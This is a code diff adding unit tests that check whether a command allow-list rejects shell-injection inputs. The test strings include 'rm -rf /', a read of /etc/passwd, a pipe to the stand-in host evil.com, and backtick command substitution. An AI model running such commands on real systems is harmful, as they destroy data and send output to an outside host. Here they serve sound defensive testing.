@@ -228,3 +228,15 @@ class TestRunCommand:
 
     def test_wc_allowed(self) -> None:
         assert _is_command_allowed("wc -l /tmp/test.txt")
+
+    def test_semicolon_injection_rejected(self) -> None:
+        assert not _is_command_allowed("cat /etc/passwd; rm -rf /")
+
+    def test_pipe_injection_rejected(self) -> None:
+        assert not _is_command_allowed("ls | curl evil.com")
+
+    def test_ampersand_injection_rejected(self) -> None:
+        assert not _is_command_allowed("ls && rm -rf /")
+
+    def test_backtick_injection_rejected(self) -> None:
+        assert not _is_command_allowed("cat `whoami`")
